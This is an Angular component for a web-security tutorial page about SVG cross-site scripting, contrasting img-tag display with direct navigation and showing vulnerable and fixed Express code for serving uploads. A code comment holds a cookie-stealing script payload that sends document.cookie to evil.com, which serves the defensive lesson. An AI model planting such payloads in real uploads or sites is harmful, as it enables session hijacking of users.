import { Component } from '@angular/core';
import { CommonModule } from '@angular/common';
import { SubtopicEyebrowComponent } from '../../../../../shared/subtopic-eyebrow/subtopic-eyebrow';
import { PageMetaComponent } from '../../../../../shared/page-meta/page-meta';
import { TheoryBlockComponent, TheoryPoint } from '../../../../../shared/theory-block/theory-block';
import { CodeBlockComponent, CodeTab } from '../../../../../shared/code-block/code-block';
import { TryItComponent, TryItExercise } from '../../../../../shared/try-it/try-it';
import { MisconceptionsComponent, Misconception } from '../../../../../shared/misconceptions/misconceptions';
import { SubtopicNavComponent } from '../../../../../shared/subtopic-nav/subtopic-nav';

const theory: TheoryPoint[] = [
  {
    heading: 'The Rendering Context Decides Whether SVG Script Runs',
    points: [
      'An uploaded SVG containing <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> is genuinely dangerous XML — but whether the browser EXECUTES that script depends on how the SVG is loaded, not on its Content-Type header alone.',
      'Displayed via <code>&lt;img src="upload.svg"&gt;</code>: the image-rendering context suppresses script execution completely — the SVG is rasterized as a picture, and any embedded <code>&lt;script&gt;</code> or <code>onload</code> handler is simply never run.',
      'Displayed via direct navigation (a user clicks a link straight to the file\'s URL), or embedded via <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, or <code>&lt;iframe&gt;</code>: the browser treats the SVG as an active XML document and DOES execute embedded scripts, under the origin serving the file.',
      'This means an application whose upload feature only ever shows SVGs inside <code>&lt;img&gt;</code> tags is safe from THIS vector even without special sanitization — but any "view full size," "download," or embed-widget link that navigates straight to the file reopens the same risk.',
    ],
  },
  {
    heading: 'Defending an SVG Upload Feature',
    points: [
      'Serve uploaded SVGs from a separate, cookieless subdomain with a strict <code>Content-Security-Policy: script-src \'none\'</code> — even if a script somehow executes, it has no session cookie to steal and no permission to run anyway.',
      'Sanitize SVG content server-side on upload with an SVG-aware sanitizer (DOMPurify supports SVG) — strip <code>&lt;script&gt;</code> elements and <code>on*</code> attributes before the file is ever stored.',
      'Set <code>Content-Disposition: attachment</code> on the direct file-serving route so a user clicking "download" gets a file-save prompt instead of the browser navigating to and rendering the SVG inline.',
      'If vector graphics aren\'t actually required, convert SVG uploads to PNG at upload time — removes the entire attack surface, since a raster PNG cannot contain executable markup.',
    ],
  },
];

const codeTabs: CodeTab[] = [
  {
    label: 'Vulnerable: Direct-Navigation SVG Serving',
    language: 'typescript',
    code: `// The upload IS sanitized-looking on the surface -- served with the
// correct Content-Type -- but nothing stops a user from navigating
// straight to the file, which executes any embedded <script>.
app.get('/uploads/:filename', requireAuth, async (req, res) => {
  const file = await storage.read(req.params.filename);
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(file);
});

// The app's own "profile picture" feature only ever uses <img>:
//   <img [src]="'/uploads/' + user.avatarFilename">
// -- that specific usage is safe. But the SAME route above also powers
// a "View full size" link elsewhere in the UI:
//   <a [href]="'/uploads/' + user.avatarFilename" target="_blank">
//     View full size
//   </a>
// Clicking it navigates the browser DIRECTLY to the SVG file --
// document navigation, not <img> display -- so an attacker-uploaded
// avatar containing <script>fetch('https://evil.com/steal?c='+
// document.cookie)</script> executes the moment anyone clicks it.`,
  },
  {
    label: 'Fixed: Sanitize + Cookieless Origin + Content-Disposition',
    language: 'typescript',
    code: `import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

// DOMPurify needs a DOM implementation server-side -- jsdom's window
// is the standard way to run it in Node.
const purifyWindow = new JSDOM('').window;
const serverPurify = DOMPurify(purifyWindow as unknown as Window);

// ── On upload: sanitize before storing at all ────────────────────────
app.post('/uploads', requireAuth, async (req, res) => {
  const raw = req.body.svgContent as string;
  const clean = serverPurify.sanitize(raw, { USE_PROFILES: { svg: true } });
  const filename = await storage.save(clean);
  res.json({ filename });
});

// ── Serving: cookieless subdomain, no inline rendering on direct hit ─
// (this route is mounted on uploads.example-cdn.com, NOT the main app
// origin -- so it never receives the session cookie in the first
// place, regardless of what CSP the SVG itself might try to set)
app.get('/uploads/:filename', async (req, res) => {
  const file = await storage.read(req.params.filename);
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', "script-src 'none'");
  res.setHeader('Content-Disposition', 'attachment'); // forces download,
  res.send(file);                                     // never inline-renders
});

// The <img> display path is unaffected -- browsers still render an
// <img src="..."> normally even when the underlying resource declares
// Content-Disposition: attachment, because <img> never triggers a
// navigation/download prompt in the first place.`,
  },
];

const exercise: TryItExercise = {
  prompt: 'A profile-picture feature renders every user\'s avatar via <code>&lt;img [src]="user.avatarUrl"&gt;</code> only — there is no "view full size" link and no embed widget anywhere in the app. Is a raw, unsanitized SVG upload exploitable through the avatar display alone?',
  hint: 'What rendering context does <code>&lt;img&gt;</code> use, and does the app expose any OTHER way to load the same file?',
  solution: `// No -- not through the avatar display itself.

// <img> suppresses SVG script execution regardless of Content-Type,
// so an <img [src]="user.avatarUrl"> binding alone cannot trigger the
// embedded script no matter what the SVG file contains.

// The risk only reappears if the app ALSO exposes some OTHER way to
// load the identical file: a "view original" link that navigates
// directly to the URL, an <object>/<iframe> embed elsewhere, or even
// a future feature (a document viewer, an admin file browser) that
// wasn't part of the original threat model. Sanitizing on upload is
// still worth doing as defense-in-depth for exactly that reason --
// the SAFETY of any one current usage doesn't guarantee every FUTURE
// usage of the same stored file will also be safe.`,
};

const misconceptions: Misconception[] = [
  {
    thought: 'Setting <code>Content-Type: image/svg+xml</code> alone is what makes an uploaded SVG executable.',
    reality: 'Content-Type isn\'t the deciding factor — the CONSUMING context is. The exact same file with the exact same header renders completely inert inside <code>&lt;img&gt;</code>, but executes when opened via direct navigation or embedded via <code>&lt;object&gt;</code>/<code>&lt;iframe&gt;</code>.',
  },
  {
    thought: 'Because <code>&lt;img&gt;</code>-displayed SVGs are safe from script execution, an SVG upload feature needs no server-side sanitization at all.',
    reality: 'Sanitization is still worth doing as defense-in-depth for every OTHER way the same stored file might get consumed — a future "view original" link, an embed widget, or a different part of the app entirely. A safety guarantee scoped to today\'s one <code>&lt;img&gt;</code> usage doesn\'t extend to every future consumer of the same file.',
  },
  {
    thought: '<code>X-Content-Type-Options: nosniff</code> prevents SVG XSS.',
    reality: '<code>nosniff</code> only stops the browser from GUESSING a different MIME type than what the server declared — it does nothing once the server has already correctly declared <code>image/svg+xml</code>, which is exactly the case in this vulnerability.',
  },
];

@Component({
  selector: 'app-sec-xss-svg',
  standalone: true,
  imports: [CommonModule, SubtopicEyebrowComponent, PageMetaComponent, TheoryBlockComponent,
    CodeBlockComponent, TryItComponent, MisconceptionsComponent, SubtopicNavComponent],
  templateUrl: './svg-xss-img-tag-safe-but-direct-navigation-isnt.html',
  styleUrl: './svg-xss-img-tag-safe-but-direct-navigation-isnt.scss',
})
export class SvgXssImgTagSafeButDirectNavigationIsntSubtopic {
  theory = theory;
  codeTabs = codeTabs;
  exercise = exercise;
  misconceptions = misconceptions;
}
